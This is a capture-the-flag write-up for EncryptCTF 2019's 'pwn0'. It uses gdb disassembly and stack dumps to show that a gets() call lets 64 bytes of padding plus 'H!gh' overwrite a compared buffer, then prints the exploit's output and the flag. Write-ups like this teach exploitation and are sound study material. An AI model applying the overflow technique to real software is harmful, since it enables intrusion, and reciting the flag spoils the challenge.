# pwn : pwn0

```
Given netcat connect `nc 104.154.106.182 1234`
Binary file  32 bit executable
```
* Executing Binary file: [pwn0](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Encrypt-2019/pwn0/pwn0?raw=true)
```
$ ./pwn0 
How's the josh?
input
Your josh is low!
Bye!
```
### Analyzing the Binary
```assembly
$ gdb ./pwn0 
gdb-peda$ disass main
Dump of assembler code for function main:
   0x080484f1 <+0>:	push   ebp
   0x080484f2 <+1>:	mov    ebp,esp
   0x080484f4 <+3>:	and    esp,0xfffffff0
   0x080484f7 <+6>:	sub    esp,0x60
   0x080484fa <+9>:	mov    eax,ds:0x80498a0
   0x080484ff <+14>:	mov    DWORD PTR [esp+0xc],0x0
   0x08048507 <+22>:	mov    DWORD PTR [esp+0x8],0x2
   0x0804850f <+30>:	mov    DWORD PTR [esp+0x4],0x0
   0x08048517 <+38>:	mov    DWORD PTR [esp],eax
   0x0804851a <+41>:	call   0x80483d0 <setvbuf@plt>
   0x0804851f <+46>:	mov    DWORD PTR [esp],0x804861d
   0x08048526 <+53>:	call   0x8048390 <puts@plt>
   0x0804852b <+58>:	lea    eax,[esp+0x1c]
   0x0804852f <+62>:	mov    DWORD PTR [esp],eax
   0x08048532 <+65>:	call   0x8048370 <gets@plt>
   0x08048537 <+70>:	mov    DWORD PTR [esp+0x8],0x4
   0x0804853f <+78>:	mov    DWORD PTR [esp+0x4],0x804862d
   0x08048547 <+86>:	lea    eax,[esp+0x5c]
   0x0804854b <+90>:	mov    DWORD PTR [esp],eax
   0x0804854e <+93>:	call   0x8048380 <memcmp@plt>
   0x08048553 <+98>:	test   eax,eax
   0x08048555 <+100>:	jne    0x804856a <main+121>
   0x08048557 <+102>:	mov    DWORD PTR [esp],0x8048632
   0x0804855e <+109>:	call   0x8048390 <puts@plt>
   0x08048563 <+114>:	call   0x80484dd <print_flag>
   0x08048568 <+119>:	jmp    0x8048576 <main+133>
   0x0804856a <+121>:	mov    DWORD PTR [esp],0x8048648
   0x08048571 <+128>:	call   0x8048390 <puts@plt>
   0x08048576 <+133>:	mov    eax,0x0
   0x0804857b <+138>:	leave  
   0x0804857c <+139>:	ret    
End of assembler dump.
gdb-peda$ b*0x0804854e
Breakpoint 1 at 0x804854e
gdb-peda$ r < [inp]()
Starting program: /home/aj/Videos/CTF-writeups/Encrypt-2019/pwn0/pwn0 < inp
How's the josh?

[----------------------------------registers-----------------------------------]
EAX: 0xffffd06c ("QQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
EBX: 0x0 
ECX: 0xf7fac5c0 --> 0xfbad2088 
EDX: 0xf7fad89c --> 0x0 
ESI: 0xf7fac000 --> 0x1d7d6c 
EDI: 0x0 
EBP: 0xffffd078 ("TTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
ESP: 0xffffd010 --> 0xffffd06c ("QQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
EIP: 0x804854e (<main+93>:	call   0x8048380 <memcmp@plt>)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804853f <main+78>:	mov    DWORD PTR [esp+0x4],0x804862d
   0x8048547 <main+86>:	lea    eax,[esp+0x5c]
   0x804854b <main+90>:	mov    DWORD PTR [esp],eax
=> 0x804854e <main+93>:	call   0x8048380 <memcmp@plt>
   0x8048553 <main+98>:	test   eax,eax
   0x8048555 <main+100>:	jne    0x804856a <main+121>
   0x8048557 <main+102>:	mov    DWORD PTR [esp],0x8048632
   0x804855e <main+109>:	call   0x8048390 <puts@plt>
Guessed arguments:
arg[0]: 0xffffd06c ("QQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
arg[1]: 0x804862d ("H!gh")
arg[2]: 0x4 
[------------------------------------stack-------------------------------------]
0000| 0xffffd010 --> 0xffffd06c ("QQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0004| 0xffffd014 --> 0x804862d ("H!gh")
0008| 0xffffd018 --> 0x4 
0012| 0xffffd01c --> 0x0 
0016| 0xffffd020 --> 0x8 
0020| 0xffffd024 --> 0xffffd2d3 ("/home/aj/Videos/CTF-writeups/Encrypt-2019/pwn0/pwn0")
0024| 0xffffd028 --> 0xf7e044a9 (add    ebx,0x1a7b57)
0028| 0xffffd02c ("AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804854e in main ()
gdb-peda$ 
```
* It is comparing the QQQQ with H!gh
* The padding is "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP" or `'A'*64`
* payload = padding + "H!gh"
* Python script [exp.py](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Encrypt-2019/pwn0/exp.py)
### output
```
$ python exp.py 
[+] Starting local process './pwn0': pid 5466
[*] Switching to interactive mode
How's the josh?
Good! here's the flag
[*] Process './pwn0' stopped with exit code 0 (pid 5466)
encryptCTF{L3t5_R4!53_7h3_J05H}
[*] Got EOF while reading in interactive
$
```
## flag is : `encryptCTF{L3t5_R4!53_7h3_J05H}`